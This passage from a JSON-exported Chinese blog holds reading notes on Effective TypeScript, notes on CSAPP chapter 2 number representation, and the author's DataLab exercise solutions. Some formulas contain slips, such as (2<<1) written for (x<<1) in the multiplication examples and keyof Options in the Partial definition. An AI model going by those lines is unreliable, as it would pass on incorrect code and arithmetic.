\"12-34-56\";\nfetchProduct(id);\nid = 123456; // OK\nfetchProductBySerialNumber(id); // OK\n```\n\n但是不要这么做，最好是再开一个变量：\n\n```ts\nconst id = \"12-34-56\";\nfetchProduct(id);\nconst serial = 123456; // OK\nfetchProductBySerialNumber(serial); // OK\n```\n\n此外，变量遮盖也不是一个好的代码习惯：\n\n```ts\n//Don't do this\nconst id = \"12-34-56\";\nfetchProduct(id);\n{\n\tconst id = 123456; // OK\n\tfetchProductBySerialNumber(id); // OK\n}\n```\n\n### 善用函数签名的类型\n\n比如下面这个代码：\n\n```ts\nfunction add(a: number, b: number) {\n\treturn a + b;\n}\nfunction sub(a: number, b: number) {\n\treturn a - b;\n}\nfunction mul(a: number, b: number) {\n\treturn a * b;\n}\nfunction div(a: number, b: number) {\n\treturn a / b;\n}\n```\n\n可以优化为下面的代码：\n\n```ts\ntype BinaryFn = (a: number, b: number) => number;\nconst add: BinaryFn = (a, b) => a + b;\nconst sub: BinaryFn = (a, b) => a - b;\nconst mul: BinaryFn = (a, b) => a * b;\nconst div: BinaryFn = (a, b) => a / b;\n```\n\n这个非常适用于定义回调函数的类型\n\n另外，比如你现在想要写一个函数，来改善原有的函数，你可以利用 typeof 来获取到原有函数的签名，就不用再费劲照抄原函数的参数和返回值类型\n\n### 善于利用 ts 的类型推断\n\n如果 ts 能正确推断出类型，就不要再去自己标注了，比如：\n\n```ts\nlet x = 12;\nlet x: number = 12; // Don't do this\n```\n\n如果参数有默认值，那么也没必要再去标注类型了：\n\n```ts\nfunction parseNumber(str: string, base = 10) {\n\t// ...\n}\n```\n\n传递闭包时，闭包的类型也没必要标注：\n\n```ts\n// Don't do this:\napp.get(\"/health\", (request: express.Request, response: express.Response) => {\n\tresponse.send(\"OK\");\n});\n```\n\n但是用字面量声明对象时，需要标注类型，开启 excess property checking\n\n此外，函数的返回值最好也标注好类型，而不是让 ts 自己推导\n\n### 尽可能使用类型声明而不是类型断言\n\n如果你要定义一个特定 interface 类型的变量，你最好是这样做：\n\n```ts\ninterface Person {\n\tname: string;\n}\nconst alice: Person = { name: \"Alice\" }; // Type is Person\n```\n\n而不是：\n\n```ts\nconst bob = { name: \"Bob\" } as Person; // Type is Person\n```\n\n因为前者有 excess property check ，可以保证你确保写代码的过程中仍有代码补全和类型安全\n\n对于箭头函数同理：\n\n```ts\nconst people = [\"alice\", \"bob\", \"jan\"].map((name): Person => ({ name })); // Type is Person[]\n```\n\n注意类型声明作用在箭头函数的返回值上，而不是引入一个 `const person: Person = {name};` 这样太麻烦了\n\n当然有时候你确实需要类型断言：\n\n- 把一个宽泛的类型断言为一个精确的类型：\n\n```ts\ndocument.querySelector(\"#myButton\").addEventListener(\"click\", (e) => {\n\te.currentTarget; // Type is EventTarget\n\tconst button = e.currentTarget as HTMLButtonElement;\n\tbutton; // Type is HTMLButtonElement\n});\n```\n\n- 非 null / undefined 断言：如果你确定这个值不会为 null / undefined ，则可以再该值后面加一个 `!`\n\n### 不要分步创建一个对象\n\n```ts\n//Don't do this\nconst pt = {} as Point;\npt.x = 3;\npt.y = 4;\n//Do this\nconst pt: Point = {\n\tx: 3,\n\ty: 4,\n};\n```\n\n如果你需要用一个小的对象创建一个大的对象，考虑使用解构：\n\n```ts\n//Don't do this\nconst pt = { x: 3, y: 4 };\nconst id = { name: \"Pythagoras\" };\nconst namedPoint = {};\nObject.assign(namedPoint, pt, id);\nnamedPoint.name;\n// ~~~~ Property 'name' does not exist on type '{}'\n\n//Do this\nconst namedPoint = { ...pt, ...id };\nnamedPoint.name; // OK, type is string\n```\n\n```ts\ndeclare let hasMiddle: boolean;\nconst firstLast = { first: \"Harry\", last: \"Truman\" };\nconst president = { ...firstLast, ...(hasMiddle ? { middle: \"S\" } : {}) };\n```\n\n### 函数签名的类型设计\n\n一个函数的接受的类型应该很广泛，返回值的类型应该尽可能单一：\n\n```ts\ninterface LngLat {\n\tlng: number;\n\tlat: number;\n}\ntype LngLatLike = LngLat | { lon: number; lat: number } | [number, number];\n```\n\n将参数类型设置为 LngLatLike ，尽可能接收更多形式\n\n### 不要在注释中重复类型\n\n函数的参数是什么类型，返回值是什么类型，都写在代码里了，不需要你再从代码注释里再写一遍\n\n### 尽可能把整体设置为 null\n\n如果两个变量，要么都不为 null ， 要么都为 null，那么你应该考虑使用 tuple 把两者结合起来，而不是设两个变量，如：\n\n```ts\n// Don't do this\nfunction extent(nums: number[]) {\n\tlet min, max;\n\tfor (const num of nums) {\n\t\tif (!min) {\n\t\t\tmin = num;\n\t\t\tmax = num;\n\t\t} else {\n\t\t\tmin = Math.min(min, num);\n\t\t\tmax = Math.max(max, num);\n\t\t\t// ~~~ Argument of type 'number | undefined' is not\n\t\t\t// assignable to parameter of type 'number'\n\t\t}\n\t}\n\treturn [min, max];\n}\n\nconst [min, max] = extent([0, 1, 2]);\nconst span = max - min;\n// ~~~ ~~~ Object is possibly 'undefined'\n\n// Do this\nfunction extent(nums: number[]) {\n\tlet result: [number, number] | null = null;\n\tfor (const num of nums) {\n\t\tif (!result) {\n\t\t\tresult = [num, num];\n\t\t} else {\n\t\t\tresult = [Math.min(num, result[0]), Math.max(num, result[1])];\n\t\t}\n\t}\n\treturn result;\n}\nconst range = extent([0, 1, 2]);\nif (range) {\n\tconst [min, max] = range;\n\tconst span = max - min; // OK\n}\n```\n\n### 把所有的类型都导出\n\n在编写一个供别人使用的模块时，最好是把所有的类型都导出，如：\n\n```ts\ninterface SecretName {\n\tfirst: string;\n\tlast: string;\n}\ninterface SecretSanta {\n\tname: SecretName;\n\tgift: string;\n}\nexport function getGift(name: SecretName, gift: string): SecretSanta {\n\t// ...\n}\n```\n\n如果这样，别人在使用的时候无法导入 SecretName 和 SecretSanta 这两个类型，就会给使用者带来一些麻烦。\n\n如果你作为一个使用者，遇到了这种情况，那么可以使用如下的方法解决：\n\n```ts\ntype MySanta = ReturnType<typeof getGift>; // SecretSanta\ntype MyName = Parameters<typeof getGift>[0]; // SecretName\n```\n\n### 给回调函数设置 this 类型\n\n目前对 js 的 this 还不太了解，以后有机会再补\n\n### 把依赖其他库的类型抽象出来\n\n比如：\n\n```ts\nfunction parseCSV(contents: string | Buffer): { [column: string]: string }[] {\n\tif (typeof contents === \"object\") {\n\t\t// It's a buffer\n\t\treturn parseCSV(contents.toString(\"utf8\"));\n\t}\n\t// ...\n}\n```\n\n其中的 Buffer 是 node.js 特有的类型。如果这个函数作为一个模块发布，那么后面在浏览器环境使用这个函数的人会产生疑惑。\n\n解决方法是，考虑到我们只使用了 Buffer 类型的 toString 方法，我们可以把这个类型单独拿出来：\n\n```ts\ninterface CsvBuffer {\n\ttoString(encoding: string): string;\n}\nfunction parseCSV(\n\tcontents: string | CsvBuffer,\n): { [column: string]: string }[] {\n\t// ...\n}\n```\n\n### 使用现代的 js 语法\n\n1. 对于循环遍历：\n   - 如果只是变量数组的元素，那么使用 for-of\n\n   - 如果还需要得到当前下表，那么使用 forEach\n\n   - 如果需要中间跳出循环，那么使用 for\n\n2. 使用 import 和 export 语法而不是 require\n3. 使用箭头函数而不是 function\n4. 善于使用解构语法\n\n### 有初始常量值就不用写类型了\n\n比如：\n\n```ts\nconst INIT_OPTIONS = {\n\twidth: 640,\n\theight: 480,\n\tcolor: \"#00FF00\",\n\tlabel: \"VGA\",\n};\ninterface Options {\n\twidth: number;\n\theight: number;\n\tcolor: string;\n\tlabel: string;\n}\n```\n\n可以把下面的 interface 的定义优化为：\n\n```ts\ntype Options = typeof INIT_OPTIONS;\n```\n\n### mapped type\n\n如：\n\n```ts\ntype Vec3D = { [k in \"x\" | \"y\" | \"z\"]: number };\n// Type Vec3D = {\n// x: number;\n// y: number;\n// z: number;\n// }\n```\n\n当然可以更加灵活：\n\n```ts\ntype ABC = { [k in \"a\" | \"b\" | \"c\"]: k extends \"b\" ? string : number };\n// Type ABC = {\n// a: number;\n// b: string;\n// c: number;\n// }\n```\n\n从外，使用 mapped type 还可以用来保证相关联的类型和值的同步\n\n### 使用 union 抽取类型的公共部分\n\n比如下面的代码：\n\n```ts\ninterface SaveAction {\n\ttype: \"save\";\n\t// ...\n}\ninterface LoadAction {\n\ttype: \"load\";\n\t// ...\n}\ntype Action = SaveAction | LoadAction;\ntype ActionType = \"save\" | \"load\"; // Repeated types!\n```\n\n可以改进为：\n\n```ts\ntype ActionType = Action[\"type\"]; // Type is \"save\" | \"load\"\n```\n\n这个和 pick 泛型不太一样：\n\n```ts\ntype ActionRec = Pick<Action, \"type\">; // {type: \"save\" | \"load\"}\n```\n\n## 其他\n\n### Monkey patching\n\n如果想以一个类型安全的方法进行 monkey patching，你可以使用 interface 的 augmented\n\n```ts\ninterface Document {\n\t/** Genus or species of monkey patch */\n\tmonkey: string;\n}\ndocument.monkey = \"Tamarin\"; // OK\n```\n\n如果你在编写一个模块，可以用 declare global\n\n```ts\nexport {};\ndeclare global {\n\tinterface Document {\n\t\t/** Genus or species of monkey patch */\n\t\tmonkey: string;\n\t}\n}\ndocument.monkey = \"Tamarin\"; // OK\n```\n\n但是这还是会出现问题：当你在别的地方引入了这个模块，其他没有引入这个模块的地方也被影响了\n\n最好是自己再开一个类型：\n\n```ts\ninterface MonkeyDocument extends Document {\n\t/** Genus or species of monkey patch */\n\tmonkey: string;\n}\n(document as MonkeyDocument).monkey = \"Macaque\";\n```\n\n### TSDoc\n\n可以按如下的形式编写注释，这种注释可以被 ide 识别，支持 markdown：\n\n```ts\n/**\n * Generate a greeting.\n * @param name Name of the person to greet\n * @param salutation The person's title\n * @returns A greeting formatted for human consumption.\n */\nfunction greetFullTSDoc(name: string, title: string) {\n\treturn `Hello ${title} ${name}`;\n}\n```\n\n![](http://pic.caiwen.work/i/2025/01/29/6799bb14957cd.png)\n\n```ts\n/**\n * This _interface_ has **three** properties:\n * 1. x\n * 2. y\n * 3. z\n */\ninterface Vector3D {\n\tx: number;\n\ty: number;\n\tz: number;\n}\n```\n\n![](http://pic.caiwen.work/i/2025/01/29/6799bb3b6ae68.png)\n\n### 访问修饰符\n\nts 中支持使用 public private 和 protected\n\n```ts\nclass Diary {\n\tprivate secret = \"cheated on my English test\";\n}\nconst diary = new Diary();\ndiary.secret;\n// ~~~~~~ Property 'secret' is private and only\n// accessible within class 'Diary'\n```\n\n但是这仅仅是在 type space 做出的限制，可以很容易绕过：\n\n```ts\nclass Diary {\n\tprivate secret = \"cheated on my English test\";\n}\nconst diary = new Diary();\n(diary as any).secret; // OK\n```\n\n### 一些工具类泛型\n\n#### Pick<T,K>\n\n可以从类型 T 中选取字段 K 来组成新的类型，其定义：\n\n```ts\ntype Pick<T, K extends keyof T> = {\n\t[k in K]: T[k];\n}; // OK\n```\n\n#### Partial< T >\n\n将 T 中所有的属性都变为可选的，其定义：\n\n```ts\ntype Partial<T> = { [k in keyof Options]?: T[k] };\n```\n\n#### 返回值和参数类型\n\nReturnType 可以用于获取一个函数的返回值类型。Parameters 可以获取一个函数的参数类型，如\n\n```ts\ntype MySanta = ReturnType<typeof getGift>; // SecretSanta\ntype MyName = Parameters<typeof getGift>[0]; // SecretName\n```\n\n#### Record\n\n可以用于简写多个类型相等的属性，如\n\n```ts\ntype Vec3D = Record<\"x\" | \"y\" | \"z\", number>;\n// Type Vec3D = {\n// x: number;\n// y: number;\n// z: number;\n// }\n```\n\n#### Readonly< T >\n\n可以将类型 T 的所有属性设置为 readonly\n\n","summary":"Effective Typescript 的读书笔记，按照个人感觉合适的顺序重新组织知识结构","key":["effective typescript","js","ts","node.js","前端"],"tags":[],"path":["开发","Effective Typescript 读书笔记.md"],"background":"http://pic.caiwen.work/i/2025/01/29/6799c5ad0e6d1.png","recommend":false,"status":"published"},{"type":"Article","title":"CSAPP第二章 - 信息的表示和处理","id":"csapp-2","createTime":"2024-12-19T14:57:00.000Z","updateTime":"2025-09-05T13:34:06.748Z","content":"\n## 预备知识\n\n- 字节：计算机内存每**8**位被分为一个块，称为一个字节，是最小的可寻址单位。\n- 十六进制——十进制——二进制对应表：\n\n![](http://pic.caiwen.work/i/2025/01/29/6799cabdde5ea.png)\n\n- 字长：指针占用的内存空间大小。在32位机器上是4字节，在64位机器上是8字节。\n- 小/大端法\n  - 小端法：最低有效字节放在内存中的前面（与阅读顺序相反）。\n  - 大端法：最低有效字节放在内存的后面（与阅读顺序相同）。\n  - 大多数机器使用小端法。\n  - 字符串类型在内存中的储存顺序与大端法还是小端法无关。\n\n- 移位运算\n  - 左移，没有什么特别的。\n  - 右移分两种\n    - 逻辑右移：直接右移，然后在高位补0。\n    - 算数右移：如果最高位为1，那么最高位补1。最高位为0，则最高位补0。\n  - 对于一个由 $w$ 位组成的数据类型，如果要移动的位数 $k$ 大于等于 $w$，则实际上是位移 $k \\space mod  \\space w$ 位。\n\n## 整数\n\n### 编码\n\n**无符号整数**\n\n对于一个位表示 $x=[x_{w-1},x_{w-2},...,x_0]$ ，其表示的十进制数为：\n\n$$\nB2U_w(x)=\\sum_{i=0}^{w-1} x_i2^i\n$$\n\n**有符号整数**\n\n对于一个位表示 $x=[x_{w-1},x_{w-2},...,x_0]$ ，其表示的十进制数为：\n\n$$\nB2T_w(x)=-x_{w-1}2^{w-1}+\\sum_{i=0}^{w-2} x_i2^i\n$$\n\n这种编码方式成为补码。\n\n**一些特殊的值**\n\n![](http://pic.caiwen.work/i/2025/01/29/6799caf8d8490.png)\n\n注意，补码的范围是不对称的，即 $|T_{min}|=|T_{max}|+1$ ，因为一半的位模式是负数，另一半的位模式是0和正数。\n\n### 无符号和有符号互转\n\n转换时确保位模式不会发生变化。\n\n**有符号转无符号**\n\n$$\nT2U_w(x)=\\begin{cases}\nx+2^w, & x<0 \\\\\nx,  & x \\ge 0\n\\end{cases}\n$$\n\n推导：\n\n对于相同的位模式 $x$，我们有：\n\n$$\nB2U_w(x)-B2T_w(x)\\\\\n=x_{w-1}2^{w-1}+\\sum_{i=0}^{w-2} x_i2^i-(-x_{w-1}2^{w-1}+\\sum_{i=0}^{w-2} x_i2^i)\\\\\n=2\\times x_{w-1}2^{w-1}=x_{w-1}2^w\n$$\n\n因此当 $B2T_w(x)$ 为负数时，$x_{w-1}$ 为 $1$，两者相差为 $2^w$。反之，$x_{w-1}$ 为 $0$，两者相同。\n\n**无符号转有符号**\n\n$$\nU2T_w(x)=\\begin{cases}x, & x\\le T_{max} \\\\x-2^w,  & x > T_{max}\\end{cases}\n$$\n\n总的来说，补码符号位为 $0$ 时，两者转换前后相同。反之，转化前后相差 $2^w$。\n\n**有符号和无符号同时出现时**\n\n在C语言中，有符号和无符号同时出现时，会隐式地将有符号转为无符号。\n\n### 扩展与截断\n\n**扩展**\n\n- 零扩展：无符号整数扩展时，高位补0。\n- 符号扩展：有符号整数扩展时，补原最高位，类似逻辑右移。\n\n零扩展和最高位为 $0$ 时的符号扩展，扩展前后表示的十进制整数一定是不变的。\n\n最高位为 $1$ 时的符号扩展，对于有符号整数，扩展前后表示的十进制整数一定也会是不变的，证明如下：\n\n$$\nB2T_{w+1}([x_{w-1},x_{w-1},x_{w-2},...,x_0])\\\\\n=-x_{w-1}2^w+x_{w-1}2^{w-1}+\\sum_{i=0}^{w-2}x_i2^i\\\\\n=-x_{w-1}(2^w-2^{w-1})+\\sum_{i=0}^{w-2}x_i2^i\\\\\n=-x_{w-1}2^{w-1}+\\sum_{i=0}^{w-2}x_i2^i\\\\\n=B2T_{w}([x_{w-1},x_{w-2},...,x_0])\n$$\n\n**截断**\n\n直接将其位模式上的高位丢弃。\n\n**两种转换同时存在**\n\n当既有有符号和无符号的转换，又有扩展或者截断时，要先改变大小，再进行有符号和无符号之间的转换。这是C语言标准规定的。\n\n### 加法\n\n先在位模式的视角直接相加，如果溢出了，则把溢出的位数直接截断。\n\n**无符号整数**\n\n位数为 $w$ 时，$x$ 和 $y$ 相加，得到 $(x+y)\\space mod \\space 2^w$。即如果要溢出了就减去 $2^w$。\n\n设得到的结果为 $s$，如果 $s<x$ 或者 $s<y$，则说明发生了溢出。\n\n**有符号整数**\n\n位数为 $w$ 时，$x$ 和 $y$ 相加，如果发生了正溢出就减去 $2^w$，如果发生了负溢出就加上 $2^w$。\n\n设得到的结果为 $s$\n\n- 当 $x>0$，$y>0$，但 $s\\le 0$ 时，说明发生了正溢出。\n- 当 $x<0$，$y<0$，但 $s\\ge 0$ 时，说明发生了负溢出。\n\n### 取相反数\n\n对于有符号整数 $x$，$-x$ 与 $\\sim x+1$ 位级表示相同。\n\n### 乘法\n\n**有符号和无符号整数之间相乘**\n\n都视为相同位级表示的无符号整数，然后相乘，得出的结果如果有溢出则截断。\n\n**乘上常数**\n\n对于要乘上的数字是一个常数的时候，则可以把乘法转化为若干个位运算来加速运算。\n\n如果要乘上 $2^k$ ，则只需要左移 $k$ 位。于是我们可以把任何的常数拆成若干个 $2$ 的幂次相加或相减。\n\n如 $14=2^3+2^2+2^1$，则 $x \\times 14=(x<<3)+(x<<2)+(2<<1)$。\n\n同时，$14=2^4-2^1$，则 $x \\times 14=(x<<4)-(2<<1)$。\n\n更一般的，我们可以将常数 $K$ 的二进制视为若干个连续0或者连续1的块交替的形式：$[(0...0)(1...1)(0...0)...(1...1)]$。\n\n考虑一组从位位置 $l$ 到位位置 $r$ 的连续的 $1$（$l\\le r$），这一部分对乘积的影响有如下两种形式：\n\n- $(x<<l)+(x<<(l+1))+...+(x<<r)$\n- $(x<<(r+1))-(x<<l)$\n\n**判断是否溢出**\n\n对于 $x$ 和 $y$ 相乘，令其结果为 $p$。\n\n如果 $x$ 为 $0$，显然不会发生溢出。\n\n反之，如果 `p/x!=y` 则说明发生溢出。\n\n### 除以2的幂\n\n**无符号**\n\n对于除以 $2^k$ 且下取整，直接逻辑右移 $k$ 位即可。\n\n**有符号**\n\n对于除以 $2^k$ ，如果直接算数右移 $k$ 位，那么得到的结果是向下取整的。\n\n但C语言中的负数做除法时，并不是向下取整，是向零取整的。\n\n当被除数为正时，没什么问题。\n\n当被除数为负时，我们先加上一个偏置值 $2^k-1$，再算数右移 $k$ 位。\n\n## 浮点数\n\n### 编码\n\n对于一个小数 $b$，我们可以将其表示为一个二进制的小数：\n\n$$\nb_mb_{m-1}...b_1b_0.b_{-1}b_{-2}...b_{-n+1}b_{-n}\n$$\n\n于是\n\n$$\nb=\\sum_{i=-n}^{m}2^i\\times b_i\n$$\n\n然后，类似与科学计数法，我们可以把上述的二进制小数表示为：\n\n$$\n(-1)^s\\times M \\times 2^E\n$$\n\n- $s$：符号，$s=1$ 时表示其为负数，$s=0$ 时表示其为整数\n- $M$：尾数，是一个二进制小数\n- $E$：阶码\n\n编码时，从高位到低位依次是：\n\n- $1$ 位的 $s$ 编码符号位 $s$\n- $k$ 位的 $exp$ 编码阶码 $E$\n- $n$ 位的 $frac$ 编码尾数 $M$\n\n![](http://pic.caiwen.work/i/2025/01/29/6799cb6c7edce.png)\n\n| 数据类型 | $k=$ | $n=$ |\n| -------- | ---- | ---- |\n| float    | 8    | 23   |\n| double   | 11   | 52   |\n\n然后，浮点数在编码时分为如下的几种类型\n\n**情况1：规格化的值**\n\n编码阶码的部分既不全为 $0$ 也不全为 $1$。\n\n![](http://pic.caiwen.work/i/2025/01/29/6799cba4545b4.png)\n\n- 对于 $E$\n  - $E=e-Bias$\n  - $e$ 为 $exp$ 字段对应的无符号整数\n  - $Bias$ 为一个偏置值，等于 $2^{k-1}-1$。对于 float 类型，其为 $127$。对于 double 类型，其为 $1023$\n  - 对于 float 类型，$E \\in [-126,127]$。对于 double 类型，$E\\in [-1022,1023]$\n- 对于 $M$\n  - $M=1+f$\n  - $f$ 为 $frac$ 编码的小数值，其二进制表示为 $0.f_{n-1}f_{n-2}...f_1f_0$\n\n**情况2：非规格化的值**\n\n编码阶码的部分全为 $0$ 。\n\n![](http://pic.caiwen.work/i/2025/01/29/6799cbd4e0929.png)\n\n- 对于 $E$\n  - $E=1-Bias$\n  - $Bias$ 与规格化值中的计算方法相同\n- 对于 $M$\n  - $M=f$\n  - $f$ 与规格化值中的计算方法相同\n- 非规格化值用来表示特别接近于 $0$ 的小数\n\n**情况3：特殊值**\n\n当编码阶码的部分全为 $1$ ，且编码尾数的部位全为 $0$ 时，其表示为无穷大\n\n![](http://pic.caiwen.work/i/2025/01/29/6799cc15aa7e6.png)\n\n但如果编码尾数的部分不全为 $0$，则表示 NaN\n\n![](http://pic.caiwen.work/i/2025/01/29/6799cc35956c5.png)\n\n**示例**\n\n对于一个 $8$ 位，$k=4$，$n=3$ 的小数，其示例如下：\n\n![](http://pic.caiwen.work/i/2025/01/29/6799cc54c3c51.png)\n\n同时，应当注意到，如果将一个浮点数的位级表示视为一个无符号整数，他们的大小顺序是相同的。对于负数的浮点数则相反\n\n### 舍入\n\n对于一般情况，正常进行四舍五入。如果一个数，恰好位于可能要舍入的两个数中间，则舍入到最后一位为偶数的那个数。\n\n例如，舍入到小数点后两位\n\n| 原数      | 舍入到的数 | 原因                                           |\n| --------- | ---------- | ---------------------------------------------- |\n| 2.8949999 | 2.89       | 不到一半，正常四舍五入                         |\n| 2.8950001 | 2.90       | 超过一般，正常四舍五入                         |\n| 2.8950000 | 2.90       | 刚好在一半时，保证最后一位是偶数，所以向上舍入 |\n| 2.8850000 | 2.88       | 刚好在一半时，保证最后一位是偶数，所以向下舍入 |\n| 10.00011  | 10.00      | 不到一半，正常四舍五入                         |\n| 10.00110  | 10.01      | 超过一般，正常四舍五入                         |\n| 10.11100  | 11.00      | 刚好在一半时，保证最后一位是偶数，所以向上舍入 |\n| 10.10100  | 10.10      | 刚好在一半时，保证最后一位是偶数，所以向下舍入 |\n\n## DataLab\n\n### bitXor\n\n```cpp\n/*\n * bitXor - x^y using only ~ and &\n *   Example: bitXor(4, 5) = 1\n *   Legal ops: ~ &\n *   Max ops: 14\n */\nint bitXor(int x, int y) {\n  return (~(x&y))&(~((~x)&(~y)));\n}\n```\n\n### tmin\n\n求 tmin\n\n```cpp\n/*\n * tmin - return minimum two's complement integer\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 4\n *   Rating: 1\n */\nint tmin(void) {\n\treturn (1<<31);\n}\n```\n\n### isTmax\n\n我们发现，Tmax + 1 和 ~Tmax 是相等的。不过，`-1` 也有这个特点，所以需要特判一下\n\n```cpp\n/*\n * isTmax - returns 1 if x is the maximum, two's complement number,\n *     and 0 otherwise\n *   Legal ops: ! ~ & ^ | +\n *   Max ops: 10\n *   Rating: 1\n */\nint isTmax(int x) {\n  \treturn (!(!(x^(~0))))&(!((x+1)^(~x)));\n}\n```\n\n我们发现，`!` 这个运算符用来搞判断是非常好用的\n\n### allOddBits\n\n我们每次把位级表示分成两半，然后把让低位的那一半与上高位的那一半，反复下去，即可求出\n\n```cpp\n/*\n * allOddBits - return 1 if all odd-numbered bits in word set to 1\n *   where bits are numbered from 0 (least significant) to 31 (most significant)\n *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 12\n *   Rating: 2\n */\nint allOddBits(int x) {\n\tx=x&(x>>16);\n\tx=x&(x>>8);\n\tx=x&(x>>4);\n\tx=x&(x>>2);\n\treturn (x>>1)&1;\n}\n```\n\n### negate\n\n```cpp\n/*\n * negate - return -x\n *   Example: negate(1) = -1.\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 5\n *   Rating: 2\n */\nint negate(int x) {\n\treturn (~x)+1;\n}\n```\n\n### isAsciiDigit\n\n```cpp\nint isAsciiDigit(int x) {\n  \tint flag1 = !((x>>4)^(0x03));\n\tint flag2 = x&(1<<3);\n\tint flag3 = x&(1<<2);\n\tint flag4 = x&(1<<1);\n\treturn flag1&((!flag2)|((!flag3)&(!flag4)));\n}\n```\n\n### conditional\n\n首先把 x 转为要么为 0 要么为 1 的条件。\n\n然后生成一个 msk，其为 `flag+(~0)`。这样的话，如果 flag 为 1，msk 就为 0，反之，msk 就为各位都为 1 的一个数。\n\n然后通过 msk 即可按条件返回不同的数。\n\n```cpp\n/*\n * conditional - same as x ? y : z\n *   Example: conditional(2,4,5) = 4\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 16\n *   Rating: 3\n */\nint conditional(int x, int y, int z) {\n  \tint flag = !(!x);\n\tint msk;\n       \tmsk = flag+(~0); //flag=0 -> msk=111... or msk = 0\n\tint t1 = msk&z; //flag=0 -> c1=z  or c1=0\n\tmsk = (!flag)+(~0); //flag=1 -> msk=111... or msk=0\n\tint t2 = msk&y; //flag=1 -> c2=y or c2=0\n\treturn t1^t2;\n}\n```\n\n### isLessOrEqual\n\n```cpp\n/*\n * isLessOrEqual - if x <= y  then return 1, else return 0\n *   Example: isLessOrEqual(4,5) = 1.\n *   Legal ops: ! ~ & ^ | + << >>\n *   Max ops: 24\n *   Rating: 3\n */\nint isLessOrEqual(int x, int y) {\n  \tint d=x+((~y)+1);\n\tint flag1=(d>>31)&1;\n\tint flag2=!d;\n\tint sym1=(x>>31)&1;\n\tint sym2=(y>>31)&1;\n\tint flag3=sym1^sym2;\n\tint p1=sym1&(!sym2);\n\tint msk=flag3+(~0);\n\tint p2=msk&(flag1|flag2);\n\treturn p1|p2;\n}\n```\n\n### logicalNeg\n\n类似上面的 allOddBits，我们判断奇数位上是否存在 1 和偶数位上是否存在 1\n\n```cpp\n/*\n * logicalNeg - implement the ! operator, using all of\n *              the legal operators except !\n *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1\n *   Legal ops: ~ & ^ | + << >>\n *   Max ops: 12\n *   Rating: 4\n */\nint logicalNeg(int x) {\n  \tx=x|(x>>16);\n\tx=x|(x>>8);\n\tx=x|(x>>4);\n\tx=x|(x>>2);\n\tint flag1=1^(x&1);\n\tint flag2=1^((x>>1)&1);\n\treturn flag1&flag2;\n}\n```\n\n### howManyBits\n\n类似二分的思想，然后再套上条件运算\n\n```cpp\n/* howManyBits - return the minimum number of bits required to represent x in\n *             two's complement\n *  Examples: howManyBits(12) = 5\n *            howManyBits(298) = 10\n *            howManyBits(-5) = 4\n *            howManyBits(0)  = 1\n *            howManyBits(-1) = 1\n *            howManyBits(0x80000000) = 32\n *  Legal ops: ! ~ & ^ | + << >>\n *  Max ops: 90\n *  Rating: 4\n */\nint howManyBits(int x) {\n  \tint ans=0;\n\tint flag1=!((x>>31)&1);\n\tint msk1=flag1+(~0);\n\tint p1=msk1&(~x);\n\tint p2=(~msk1)&(x);\n\tx=p1^p2;\n\tint m1=1;\n\tint m2=(1<<2)+(~0);\n\tint m4=(1<<4)+(~0);\n\tint m8=(1<<8)+(~0);\n\tint m16=(1<<16)+(~0);\n\tint now=x;\n\tint tmp,flag,msk;\n\t//16\n\ttmp=now>>16;\n\tflag=!(!tmp);\n\tmsk=flag+(~0);\n\tans=ans+((~msk)&(16));\n\tnow=((msk&(now&m16))^((~msk)&(tmp)));\n\t//8\n\ttmp=now>>8;\n\tflag=!(!tmp);\n\tmsk=flag+(~0);\n\tans=ans+((~msk)&(8));\n\tnow=((msk&(now&m8))^((~msk)&(tmp)));\n\t//4\n\ttmp=now>>4;\n\tflag=!(!tmp);\n\tmsk=flag+(~0);\n\tans=ans+((~msk)&(4));\n\tnow=((msk&(now&m4))^((~msk)&(tmp)));\n\t//2\n\ttmp=now>>2;\n\tflag=!(!tmp);\n\tmsk=flag+(~0);\n\tans=ans+((~msk)&(2));\n\tnow=((msk&(now&m2))^((~msk)&(tmp)));\n\t//1\n\ttmp=now>>1;\n\tflag=!(!tmp);\n\tmsk=flag+(~0);\n\tans=ans+((~msk)&(1));\n\tnow=((msk&(now&m1))^((~msk)&(tmp)));\n\tflag=!(!now);\n\tmsk=flag+(~0);\n\tans=ans+((~msk)&(1));\n\treturn ans+1;\n}\n```\n\n### floatScale2\n\n我们发现，对于非规格化的浮点数，乘二就相当于把尾数部分左移一位\n\n对于规格化数，把阶码部分加上 1 即可\n\n```cpp\n/*\n * floatScale2 - Return bit-level equivalent of expression 2*f for\n *   floating point argument f.\n *   Both the argument and result are passed as unsigned int's, but\n *   they are to be interpreted as the bit-level representation of\n *   single-precision floating point values.\n *   When argument is NaN, return argument\n *   Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while\n *   Max ops: 30\n *   Rating: 4\n */\nunsigned floatScale2(unsigned uf) {\n  \tunsigned s=(uf>>31);//1\n\tunsigned e=((uf<<1)>>24);//8\n\tunsigned m=((uf<<9)>>9);//23\n\tif(!e){\n\t\treturn (s<<31)|(uf<<1);\n\t}else{\n\t\tif(e==0xfe) return ((s<<8)|(0xff))<<23;\n\t\telse if(e==0xff){\n\t\t\tif(m) return uf;\n\t\t\treturn ((s<<8)|(0xff))<<23;\n\t\t}\n\t\telse return (s<<31)|((e+1)<<23)|m;\n\t}\n}\n```\n\n### floatFloat2Int\n\n非规格化数一定全小于 1，规格化数中的一部分也是小于 1 的\n\n```cpp\n/*\n * floatFloat2Int - Return bit-level equivalent of expression (int) f\n *   for floating point argument f.\n *   Argument is passed as unsigned int, but\n *   it is to be interpreted as the bit-level representation of a\n *   single-precision floating point value.\n *   Anything out of range (including NaN and infinity) should return\n *   0x80000000u.\n *   Legal ops: Any integer/unsigned operations incl. ||, &&. also if, while\n *   Max ops: 30\n *   Rating: 4\n */\nint floatFloat2Int(unsigned uf) {\n  \tunsigned s = (uf>>31);//1\n\tunsigned e = ((uf<<1)>>24);//8\n\tunsigned m = ((uf<<9)>>9);//23\n\tif(!e) return 0;\n\tif(e<127) return 0;\n\te=e-127;\n\tif(e>=32) return 0x80000000u;\n\tif(e<=23) m = m>>(23-e);\n\telse m = m<<(e-23);\n\tm = (1<<e)|m;\n\tif(s){\n\t\tif(m>0x80000000u) return 0x80000000u;\n\t\telse if(m==0x80000000u) return 